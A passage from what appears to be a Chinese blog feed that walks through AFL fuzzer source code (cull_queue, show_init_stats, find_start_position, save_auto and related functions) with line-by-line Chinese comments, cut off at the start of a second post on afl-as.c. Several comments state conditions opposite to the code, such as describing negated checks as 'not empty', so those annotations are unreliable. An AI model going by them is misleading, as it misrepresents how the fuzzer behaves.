class="hljs-number">0</span>;<br>         &#125;<br><br>       &#125;<br><br>       <span class="hljs-comment">/* Insert ourselves as the new winner. */</span><br><br>       top_rated[i] = q;        <span class="hljs-comment">// 设置top_rated[i]为当前queue</span><br>       q-&gt;tc_ref++;     <span class="hljs-comment">// tc_ref++</span><br><br>       <span class="hljs-keyword">if</span> (!q-&gt;trace_mini) &#123;    <span class="hljs-comment">// 若q-&gt;trace_mini为空</span><br>         q-&gt;trace_mini = ck_alloc(MAP_SIZE &gt;&gt; <span class="hljs-number">3</span>);       <span class="hljs-comment">// 为q-&gt;trace_mini分配空间</span><br>         minimize_bits(q-&gt;trace_mini, trace_bits);      <span class="hljs-comment">// 压缩q-&gt;trace_mini</span><br>       &#125;<br><br>       score_changed = <span class="hljs-number">1</span>;       <span class="hljs-comment">// 设置score_changed为1</span><br><br>     &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="minimize-bits"><a href="#minimize-bits" class="headerlink" title="minimize_bits"></a>minimize_bits</h3><p>将1byte压缩为1bit处理。</p><p>简单的理解就是把原本是包括了是否覆盖到和覆盖了多少次的byte，压缩成是否覆盖到的bit。</p><p><a href="https://blog.csdn.net/lxlmycsdnfree/article/details/78926359">经典算法系列之(一) - BitMap 数据的压缩存储</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Compact trace bytes into a smaller bitmap. We effectively just drop the</span><br><span class="hljs-comment">   count information here. This is called only sporadically, for some</span><br><span class="hljs-comment">   new paths. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">minimize_bits</span><span class="hljs-params">(u8* dst, u8* src)</span> &#123;<br><br>  u32 i = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">while</span> (i &lt; MAP_SIZE) &#123;<br><br>    <span class="hljs-keyword">if</span> (*(src++)) dst[i &gt;&gt; <span class="hljs-number">3</span>] |= <span class="hljs-number">1</span> &lt;&lt; (i &amp; <span class="hljs-number">7</span>);<span class="hljs-comment">// 将对应字节放到对应的位上，用1bit表示1bytes</span><br>    i++;<br><br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h3><p>精简队列。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The second part of the mechanism discussed above is a routine that</span><br><span class="hljs-comment">   goes over top_rated[] entries, and then sequentially grabs winners for</span><br><span class="hljs-comment">   previously-unseen bytes (temp_v) and marks them as favored, at least</span><br><span class="hljs-comment">   until the next run. The favored entries are given more air time during</span><br><span class="hljs-comment">   all fuzzing steps. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">cull_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>* <span class="hljs-title">q</span>;</span><br>  <span class="hljs-type">static</span> u8 temp_v[MAP_SIZE &gt;&gt; <span class="hljs-number">3</span>];<br>  u32 i;<br><br>  <span class="hljs-keyword">if</span> (dumb_mode || !score_changed) <span class="hljs-keyword">return</span>;      <span class="hljs-comment">// 如果处于dumb模式或者score没有发生变化（top_rated没有发生变化），直接返回</span><br><br>  score_changed = <span class="hljs-number">0</span>;    <span class="hljs-comment">// 将score_changed设置为0</span><br><br>  <span class="hljs-built_in">memset</span>(temp_v, <span class="hljs-number">255</span>, MAP_SIZE &gt;&gt; <span class="hljs-number">3</span>);   <span class="hljs-comment">// 初始化temp_v为0xff</span><br><br>  queued_favored  = <span class="hljs-number">0</span>;<br>  pending_favored = <span class="hljs-number">0</span>;<br><br>  q = <span class="hljs-built_in">queue</span>;<br><br>  <span class="hljs-keyword">while</span> (q) &#123;   <span class="hljs-comment">// 遍历queue，将所有的q-&gt;favored置为0</span><br>    q-&gt;favored = <span class="hljs-number">0</span>;<br>    q = q-&gt;next;<br>  &#125;<br><br>  <span class="hljs-comment">/* Let&#x27;s see if anything in the bitmap isn&#x27;t captured in temp_v.</span><br><span class="hljs-comment">     If yes, and if it has a top_rated[] contender, let&#x27;s use it. */</span><br>  <br>  <span class="hljs-comment">// 将i从0到MAP_SIZE迭代，其实就是筛选出一组queue entry，能够覆盖到所有已经覆盖到的路径</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAP_SIZE; i++)<br>    <span class="hljs-keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="hljs-number">3</span>] &amp; (<span class="hljs-number">1</span> &lt;&lt; (i &amp; <span class="hljs-number">7</span>)))) &#123;    <span class="hljs-comment">// 若top_tated[i]不为空，且temp_v对应的bit有没有被置空</span><br><br>      u32 j = MAP_SIZE &gt;&gt; <span class="hljs-number">3</span>;<br><br>      <span class="hljs-comment">/* Remove all bits belonging to the current entry from temp_v. */</span><br><br>      <span class="hljs-keyword">while</span> (j--)       <span class="hljs-comment">// 从temp_v中清除掉所有top_rated[i]覆盖到的queue，即将对应的bit置为0</span><br>        <span class="hljs-keyword">if</span> (top_rated[i]-&gt;trace_mini[j])<br>          temp_v[j] &amp;= ~top_rated[i]-&gt;trace_mini[j];<br><br>      top_rated[i]-&gt;favored = <span class="hljs-number">1</span>;        <span class="hljs-comment">// 设置top_tated[i]-&gt;favored为1</span><br>      queued_favored++; <span class="hljs-comment">// queued_favored数量+1</span><br><br>      <span class="hljs-keyword">if</span> (!top_rated[i]-&gt;was_fuzzed) pending_favored++; <span class="hljs-comment">// 为0代表没有被fuzz过</span><br><br>    &#125;<br><br>  q = <span class="hljs-built_in">queue</span>;<br><br>  <span class="hljs-keyword">while</span> (q) &#123;   <span class="hljs-comment">// 遍历q</span><br>    mark_as_redundant(q, !q-&gt;favored);  <span class="hljs-comment">// 根据q-&gt;favored标志位标记是否为无用的路径</span><br>    q = q-&gt;next;<br>  &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="mark-as-redundant"><a href="#mark-as-redundant" class="headerlink" title="mark_as_redundant"></a>mark_as_redundant</h3><p>标记无用的&#x2F;冗余的queue。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Mark / unmark as redundant (edge-only). This is not used for restoring state,</span><br><span class="hljs-comment">   but may be useful for post-processing datasets. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">mark_as_redundant</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> queue_entry* q, u8 state)</span> &#123;<br><br>  u8* fn;<br>  s32 fd;<br><br>  <span class="hljs-keyword">if</span> (state == q-&gt;fs_redundant) <span class="hljs-keyword">return</span>;         <span class="hljs-comment">// 若state = q-&gt;fs_redundant, 代表已经被标记过的，直接返回</span><br> <br>  q-&gt;fs_redundant = state;<br><br>  fn = <span class="hljs-built_in">strrchr</span>(q-&gt;fname, <span class="hljs-string">&#x27;/&#x27;</span>);  <span class="hljs-comment">// 获取q-&gt;fname名称</span><br>  fn = alloc_printf(<span class="hljs-string">&quot;%s/queue/.state/redundant_edges/%s&quot;</span>, out_dir, fn + <span class="hljs-number">1</span>);     <span class="hljs-comment">// out_dir/queue/.state/redundant_edges/fn+1</span><br><br>  <span class="hljs-keyword">if</span> (state) &#123;  <span class="hljs-comment">// 如果state不为空，即not favored</span><br>    <br>    fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0600</span>);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);<br>    close(fd);<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br><br>    <span class="hljs-keyword">if</span> (unlink(fn)) PFATAL(<span class="hljs-string">&quot;Unable to remove &#x27;%s&#x27;&quot;</span>, fn);<br><br>  &#125;<br><br>  ck_free(fn);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h3><p>显示统计信息，以及设置一些基本量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Display quick statistics at the end of processing the input directory,</span><br><span class="hljs-comment">   plus a bunch of warnings. Some calibration stuff also ended up here,</span><br><span class="hljs-comment">   along with several hardcoded constants. Maybe clean up eventually. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">show_init_stats</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>* <span class="hljs-title">q</span> =</span> <span class="hljs-built_in">queue</span>;<br>  u32 min_bits = <span class="hljs-number">0</span>, max_bits = <span class="hljs-number">0</span>;<br>  u64 min_us = <span class="hljs-number">0</span>, max_us = <span class="hljs-number">0</span>;<br>  u64 avg_us = <span class="hljs-number">0</span>;<br>  u32 max_len = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (total_cal_cycles) avg_us = total_cal_us / total_cal_cycles;       <span class="hljs-comment">// 若total_cal_cycles不为空，计算每轮平均执行时间</span><br><br>  <span class="hljs-keyword">while</span> (q) &#123;   <span class="hljs-comment">// 遍历queue，获取最小的min_us，最大的max_us，以及最小的min_bits，最大的max_bits，最大长度max_len</span><br><br>    <span class="hljs-keyword">if</span> (!min_us || q-&gt;exec_us &lt; min_us) min_us = q-&gt;exec_us;<br>    <span class="hljs-keyword">if</span> (q-&gt;exec_us &gt; max_us) max_us = q-&gt;exec_us;<br><br>    <span class="hljs-keyword">if</span> (!min_bits || q-&gt;bitmap_size &lt; min_bits) min_bits = q-&gt;bitmap_size;<br>    <span class="hljs-keyword">if</span> (q-&gt;bitmap_size &gt; max_bits) max_bits = q-&gt;bitmap_size;<br><br>    <span class="hljs-keyword">if</span> (q-&gt;len &gt; max_len) max_len = q-&gt;len;<br><br>    q = q-&gt;next;<br><br>  &#125;<br><br>  SAYF(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (avg_us &gt; (qemu_mode ? <span class="hljs-number">50000</span> : <span class="hljs-number">10000</span>))     <span class="hljs-comment">// 若avg_us大于10000，或者qemu模式的50000，打印警告信息</span><br>    WARNF(cLRD <span class="hljs-string">&quot;The target binary is pretty slow! See %s/perf_tips.txt.&quot;</span>,<br>          doc_path);<br><br>  <span class="hljs-comment">/* Let&#x27;s keep things moving with slow binaries. */</span><br>  <span class="hljs-comment">// 展示执行速度</span><br>  <span class="hljs-keyword">if</span> (avg_us &gt; <span class="hljs-number">50000</span>) havoc_div = <span class="hljs-number">10</span>;     <span class="hljs-comment">/* 0-19 execs/sec   */</span><br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (avg_us &gt; <span class="hljs-number">20000</span>) havoc_div = <span class="hljs-number">5</span>; <span class="hljs-comment">/* 20-49 execs/sec  */</span><br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (avg_us &gt; <span class="hljs-number">10000</span>) havoc_div = <span class="hljs-number">2</span>; <span class="hljs-comment">/* 50-100 execs/sec */</span><br><br>  <span class="hljs-keyword">if</span> (!resuming_fuzz) &#123; <span class="hljs-comment">// 若resuming_fuzz不为空，打印警告信息</span><br><br>    <span class="hljs-keyword">if</span> (max_len &gt; <span class="hljs-number">50</span> * <span class="hljs-number">1024</span>)<br>      WARNF(cLRD <span class="hljs-string">&quot;Some test cases are huge (%s) - see %s/perf_tips.txt!&quot;</span>,<br>            DMS(max_len), doc_path);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (max_len &gt; <span class="hljs-number">10</span> * <span class="hljs-number">1024</span>)<br>      WARNF(<span class="hljs-string">&quot;Some test cases are big (%s) - see %s/perf_tips.txt.&quot;</span>,<br>            DMS(max_len), doc_path);<br><br>    <span class="hljs-keyword">if</span> (useless_at_start &amp;&amp; !in_bitmap)<br>      WARNF(cLRD <span class="hljs-string">&quot;Some test cases look useless. Consider using a smaller set.&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (queued_paths &gt; <span class="hljs-number">100</span>)<br>      WARNF(cLRD <span class="hljs-string">&quot;You probably have far too many input files! Consider trimming down.&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (queued_paths &gt; <span class="hljs-number">20</span>)<br>      WARNF(<span class="hljs-string">&quot;You have lots of input files; try starting small.&quot;</span>);<br><br>  &#125;<br><br>  OKF(<span class="hljs-string">&quot;Here are some useful stats:\n\n&quot;</span><br><br>      cGRA <span class="hljs-string">&quot;    Test case count : &quot;</span> cRST <span class="hljs-string">&quot;%u favored, %u variable, %u total\n&quot;</span><br>      cGRA <span class="hljs-string">&quot;       Bitmap range : &quot;</span> cRST <span class="hljs-string">&quot;%u to %u bits (average: %0.02f bits)\n&quot;</span><br>      cGRA <span class="hljs-string">&quot;        Exec timing : &quot;</span> cRST <span class="hljs-string">&quot;%s to %s us (average: %s us)\n&quot;</span>,<br>      queued_favored, queued_variable, queued_paths, min_bits, max_bits, <br>      ((<span class="hljs-type">double</span>)total_bitmap_size) / (total_bitmap_entries ? total_bitmap_entries : <span class="hljs-number">1</span>),<br>      DI(min_us), DI(max_us), DI(avg_us));      <span class="hljs-comment">// 打印执行信息</span><br><br>  <span class="hljs-keyword">if</span> (!timeout_given) &#123; <span class="hljs-comment">// 若timeout_given不为空，设置timeout_given</span><br><br>    <span class="hljs-comment">/* Figure out the appropriate timeout. The basic idea is: 5x average or</span><br><span class="hljs-comment">       1x max, rounded up to EXEC_TM_ROUND ms and capped at 1 second.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       If the program is slow, the multiplier is lowered to 2x or 3x, because</span><br><span class="hljs-comment">       random scheduler jitter is less likely to have any impact, and because</span><br><span class="hljs-comment">       our patience is wearing thin =) */</span><br>    <br>    <span class="hljs-comment">// 根据avg_us设置exec_tmount</span><br>    <span class="hljs-keyword">if</span> (avg_us &gt; <span class="hljs-number">50000</span>) exec_tmout = avg_us * <span class="hljs-number">2</span> / <span class="hljs-number">1000</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (avg_us &gt; <span class="hljs-number">10000</span>) exec_tmout = avg_us * <span class="hljs-number">3</span> / <span class="hljs-number">1000</span>;<br>    <span class="hljs-keyword">else</span> exec_tmout = avg_us * <span class="hljs-number">5</span> / <span class="hljs-number">1000</span>;<br><br>    exec_tmout = MAX(exec_tmout, max_us / <span class="hljs-number">1000</span>);<br>    exec_tmout = (exec_tmout + EXEC_TM_ROUND) / EXEC_TM_ROUND * EXEC_TM_ROUND;<br><br>    <span class="hljs-keyword">if</span> (exec_tmout &gt; EXEC_TIMEOUT) exec_tmout = EXEC_TIMEOUT;<br><br>    ACTF(<span class="hljs-string">&quot;No -t option specified, so I&#x27;ll use exec timeout of %u ms.&quot;</span>, <br>         exec_tmout);<br><br>    timeout_given = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 设置timeout_given为1</span><br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (timeout_given == <span class="hljs-number">3</span>) &#123;      <span class="hljs-comment">// 若timeout_given为3</span><br><br>    ACTF(<span class="hljs-string">&quot;Applying timeout settings from resumed session (%u ms).&quot;</span>, exec_tmout);<br><br>  &#125;<br><br>  <span class="hljs-comment">/* In dumb mode, re-running every timing out test case with a generous time</span><br><span class="hljs-comment">     limit is very expensive, so let&#x27;s select a more conservative default. */</span><br><br>  <span class="hljs-keyword">if</span> (dumb_mode &amp;&amp; !getenv(<span class="hljs-string">&quot;AFL_HANG_TMOUT&quot;</span>))   <span class="hljs-comment">// 若为简易模式，且环境变量AFL_HANG_TMOUT不为空，设置hang_tmout</span><br>    hang_tmout = MIN(EXEC_TIMEOUT, exec_tmout * <span class="hljs-number">2</span> + <span class="hljs-number">100</span>);<br><br>  OKF(<span class="hljs-string">&quot;All set and ready to roll!&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h3><p>resume时，查找queue起始位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* When resuming, try to find the queue position to start from. This makes sense</span><br><span class="hljs-comment">   only when resuming, and when we can find the original fuzzer_stats. */</span><br><br><span class="hljs-type">static</span> u32 <span class="hljs-title function_">find_start_position</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-type">static</span> u8 tmp[<span class="hljs-number">4096</span>]; <span class="hljs-comment">/* Ought to be enough for anybody. */</span><br><br>  u8  *fn, *off;<br>  s32 fd, i;<br>  u32 ret;<br><br>  <span class="hljs-keyword">if</span> (!resuming_fuzz) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 若resuming_fuzz为空，直接返回</span><br><br>  <span class="hljs-keyword">if</span> (in_place_resume) fn = alloc_printf(<span class="hljs-string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);   <span class="hljs-comment">// 若in_place_resume不为空</span><br>  <span class="hljs-keyword">else</span> fn = alloc_printf(<span class="hljs-string">&quot;%s/../fuzzer_stats&quot;</span>, in_dir);<br><br>  fd = open(fn, O_RDONLY);      <span class="hljs-comment">// 打开fn文件</span><br>  ck_free(fn);<br><br>  <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>  i = read(fd, tmp, <span class="hljs-keyword">sizeof</span>(tmp) - <span class="hljs-number">1</span>); (<span class="hljs-type">void</span>)i; <span class="hljs-comment">/* Ignore errors */</span>      <span class="hljs-comment">// 读取fuzzer_stats内容到tmp数组</span><br>  close(fd);<br><br>  off = <span class="hljs-built_in">strstr</span>(tmp, <span class="hljs-string">&quot;cur_path          : &quot;</span>);    <span class="hljs-comment">// 若查找到cur_path，提取出当前path</span><br>  <span class="hljs-keyword">if</span> (!off) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>  ret = atoi(off + <span class="hljs-number">20</span>); <span class="hljs-comment">// 将off转换为int型</span><br>  <span class="hljs-keyword">if</span> (ret &gt;= queued_paths) ret = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> ret;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file"></a>write_stats_file</h3><p>更新统计信息。</p><h3 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h3><p>自动保存自动生成的extra。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Save automatically generated extras. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">save_auto</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  u32 i;<br><br>  <span class="hljs-keyword">if</span> (!auto_changed) <span class="hljs-keyword">return</span>;    <span class="hljs-comment">// 若auto_changed不为空，直接返回</span><br>  auto_changed = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MIN(USE_AUTO_EXTRAS, a_extras_cnt); i++) &#123;    <span class="hljs-comment">// 遍历a_extras数组</span><br><br>    u8* fn = alloc_printf(<span class="hljs-string">&quot;%s/queue/.state/auto_extras/auto_%06u&quot;</span>, out_dir, i);<br>    s32 fd;<br><br>    fd = open(fn, O_WRONLY | O_CREAT | O_TRUNC, <span class="hljs-number">0600</span>);  <span class="hljs-comment">// 以只写模式打开fn文件</span><br><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);<br><br>    ck_write(fd, a_extras[i].data, a_extras[i].len, fn);        <span class="hljs-comment">// 将a_extras写入文件</span><br><br>    close(fd);  <span class="hljs-comment">// 关闭文件</span><br>    ck_free(fn);<br><br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>参考链接</strong></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://hollk.blog.csdn.net/category_11470526.html">https://hollk.blog.csdn.net/category_11470526.html</a></p><p><a href="https://paper.seebug.org/1732/">https://paper.seebug.org/1732/</a></p><p><a href="https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">https://www.z1r0.top/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>afl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL源码分析(二)</title>
    <link href="/2023/10/04/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%BA%8C/"/>
    <url>/2023/10/04/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL源码分析-二"><a href="#AFL源码分析-二" class="headerlink" title="AFL源码分析(二)"></a>AFL源码分析(二)</h1><h2 id="afl-as-c"><a href="#afl-as-c" class="headerlink" title="afl-as.c"></a>afl-as.c</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span 